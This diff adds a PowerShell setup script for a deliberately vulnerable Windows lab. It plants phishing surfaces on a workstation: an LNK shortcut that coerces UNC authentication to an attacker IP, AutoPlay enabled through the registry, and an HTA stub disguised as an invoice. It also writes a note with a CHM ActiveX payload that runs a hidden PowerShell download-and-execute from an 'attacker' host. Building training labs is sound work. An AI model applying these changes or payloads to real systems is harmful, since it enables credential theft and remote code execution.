@@ -1,0 +1,79 @@
+#Requires -Version 5
+# ==============================================================================
+# vuln_ia_surface — phishing/coercion drop surface (BATCHED, ws01 only).
+# Replaces ~5 WinRM round-trips with 1. IA-052 LNK UNC coercion, IA-053 AutoPlay,
+# IA-056 HTA stub, IA-063 CHM note. Deliberately vulnerable lab.
+# ==============================================================================
+$ErrorActionPreference = 'Continue'
+$log = 'C:\DunderLab\vuln_ia_phishing.log'
+New-Item -ItemType Directory -Force -Path (Split-Path $log) | Out-Null
+function Log($m) { Add-Content -Path $log -Value "$(Get-Date -Format o) $m"; Write-Output $m }
+
+# ── IA-052: malicious LNK that triggers UNC authentication ───────────────────
+try {
+  $lnkPath = '{{ phishing_drop_path }}\Shared Resources.lnk'
+  if (Test-Path $lnkPath) {
+    Log "OK: IA-052 LNK already present"
+  } else {
+    $shell = New-Object -ComObject WScript.Shell
+    $lnk = $shell.CreateShortcut($lnkPath)
+    $lnk.TargetPath   = '\\{{ ia_attacker_ip }}\share\payload.exe'
+    $lnk.IconLocation = '%SystemRoot%\system32\shell32.dll,4'
+    $lnk.Description  = 'IA-052: LNK UNC coercion'
+    $lnk.Save()
+    Log "CHANGED: IA-052 LNK created"
+  }
+} catch { Log "ERROR: IA-052 $($_.Exception.Message)" }
+
+# ── IA-053: AutoPlay enabled for all drives ──────────────────────────────────
+try {
+  $k = 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer'
+  if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
+  Set-ItemProperty -Path $k -Name NoDriveTypeAutoRun -Value 0 -Type DWord
+  Log "CHANGED: IA-053 AutoPlay enabled"
+} catch { Log "ERROR: IA-053 $($_.Exception.Message)" }
+
+# ── IA-056: HTA payload stub in Downloads ────────────────────────────────────
+try {
+  $hta = @'
+<html>
+<head><hta:application id="oHTA" applicationName="Invoice" windowState="minimize"
+  showInTaskbar="no" singleInstance="yes" /></head>
+<script language="VBScript">
+' IA-056: HTA execution surface (DVAD lab)
+' Replace with payload — executes in Medium integrity via mshta.exe
+Sub Window_OnLoad
+  MsgBox "IA-056: HTA execution successful. Place payload here."
+  window.close
+End Sub
+</script>
+</html>
+'@
+  Set-Content -Path 'C:\Users\Administrator\Downloads\Invoice_2024.hta' -Value $hta -Encoding ASCII
+  Log "CHANGED: IA-056 HTA stub dropped"
+} catch { Log "ERROR: IA-056 $($_.Exception.Message)" }
+
+# ── IA-063: CHM/ActiveX technique note ───────────────────────────────────────
+try {
+  New-Item -ItemType Directory -Force -Path 'C:\Flags' | Out-Null
+  $chm = @'
+IA-063: Compiled HTML Help (.chm) with ActiveX Execution
+==========================================================
+CHM files can execute ActiveX objects when opened by hh.exe.
+Payload delivery via email attachment or shared drive.
+
+Build:
+  HTML2CHM with malicious.html containing:
+    <OBJECT id="x" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1>
+    <PARAM name="Command" value="ShortCut">
+    <PARAM name="Button" value="Bitmap::shortcut">
+    <PARAM name="Item1" value=",cmd.exe,/c powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload')">
+    </OBJECT>
+
+Tools: Out-CHM (Nishang), Empire CHM stager
+'@
+  Set-Content -Path 'C:\Flags\FLAG-IA-063-CHM-ActiveX.txt' -Value $chm
+  Log "CHANGED: IA-063 CHM note dropped"
+} catch { Log "ERROR: IA-063 $($_.Exception.Message)" }
+
+Write-Output "DONE"
